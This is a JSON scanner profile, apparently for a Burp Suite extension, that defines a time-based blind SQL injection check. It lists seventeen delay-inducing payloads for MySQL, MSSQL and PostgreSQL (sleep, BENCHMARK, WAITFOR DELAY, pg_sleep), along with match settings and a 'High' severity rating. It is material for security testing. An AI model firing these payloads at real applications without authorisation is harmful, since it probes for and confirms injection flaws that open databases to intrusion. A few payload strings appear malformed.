[
  {
    "ProfileName": "BlindSQLi-TimeBased",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@harshinsecurity",
    "Payloads": [
      "true,\u0027 and sleep 12--",
      "true,\u0027 and sleep 12",
      "true,\u0027 and sleep 12 and \u00271\u0027\u003d\u00271",
      "true,\u0027 and sleep(12) and \u00271\u0027\u003d\u00271",
      "true,\u0027 and sleep(12)--",
      "true,\u0027 and sleep(12)",
      "true,;sleep(12)--",
      "true,\u0027 SELECT BENCHMARK(1200000,MD5(\u0027A\u0027));",
      "true,\u0027 SELECT SLEEP(12); #",
      "true,\u0027 WAITFOR DELAY \u00270:0:12\u0027--",
      "true,\u0027 WAITFOR DELAY \u00270:0:12\u0027",
      "true,\u0027 SELECT pg_sleep(12);",
      "true,(select_from(select(sleep(2)))a)+(select_from(select(sleep(12)))a)",
      "true,(select_from(select(sleep(12)))a)_",
      "true,(select*from(select(sleep(12)))a)",
      "true,Value",
      "true,0\u0027XOR(if(now()\u003dsysdate(),sleep(12),0))XOR\u0027Z"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [],
    "Tags": [
      "SQLi",
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "10",
    "TimeOut2": "15",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "isHeaderValue": false,
    "sequence": false,
    "NewHeaders": [],
    "MatchType": 5,
    "Scope": 0,
    "RedirType": 0,
    "MaxRedir": 0,
    "requestType": 1,
    "rawRequest": "",
    "payloadPosition": 2,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "BlindSQLi-TimeBased",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      18,
      65,
      70,
      80,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      21,
      31,
      41,
      51,
      61,
      71,
      72,
      73,
      74,
      75,
      76,
      77,
      36,
      81,
      82
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false,
    "changeHttpRequest": false,
    "showIssue": false,
    "changeHttpRequestType": 1
  }
]